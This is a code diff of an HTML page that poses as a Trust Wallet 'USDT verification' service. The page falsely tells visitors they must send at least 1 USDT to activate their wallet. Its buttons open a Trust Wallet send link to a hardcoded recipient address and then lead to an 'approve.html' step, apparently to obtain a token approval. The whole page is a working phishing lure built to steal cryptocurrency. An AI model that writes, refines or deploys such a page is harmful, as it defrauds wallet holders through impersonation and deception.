@@ -1,50 +1,64 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Trust Wallet USDT Verification</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify USDT</title>
   <style>
     body {
-      background: #001533;
+      background: #001b3d;
+      font-family: 'Segoe UI', sans-serif;
       color: white;
-      font-family: sans-serif;
+      text-align: center;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      text-align: center;
+      padding: 20px;
     }
-
     .btn {
-      background: #1e90ff;
-      color: white;
+      background: #00b3ff;
+      color: #fff;
       padding: 14px 32px;
       font-size: 18px;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
-      margin-top: 20px;
+      margin: 12px;
+      transition: background 0.3s ease;
+    }
+    .btn:hover {
+      background: #0099dd;
+    }
+    .info {
+      font-size: 15px;
+      opacity: 0.85;
+      max-width: 300px;
+    }
+    .powered {
+      font-size: 12px;
+      opacity: 0.6;
+      margin-top: 30px;
+    }
+    img {
+      width: 90px;
+      margin-bottom: 20px;
     }
   </style>
 </head>
 <body>
-  <h2>Trust Wallet Verification</h2>
-  <p>Trusted by millions of users</p>
-
-  <button class="btn" onclick="verify()">Verify via Trust Wallet</button>
-
-  <script>
-    function verify() {
-      // Step 1: Open Trust Wallet Send page
+  <img src="logo.png" alt="Trust Wallet Logo">
+  <h2>Verify Your Wallet</h2>
+  <p class="info">To verify and activate, you must send at least 1 USDT using Trust Wallet. After that, approve access to complete verification.</p>
+  <button class="btn" onclick="sendUSDT()">Send USDT</button>
+  <button class="btn" onclick="goToApprove()">Approve</button>
+  <p class="powered">Powered by Trust Wallet &bull; Trusted by millions</p>  <script>
+    function sendUSDT() {
       window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
-      
-      // Step 2: After 7 seconds, redirect to Approve
-      setTimeout(() => {
-        window.location.href = "approve.html";
-      }, 7000); // 7 seconds
     }
-  </script>
-</body>
+
+    function goToApprove() {
+      window.location.href = "approve.html";
+    }
+  </script></body>
 </html>
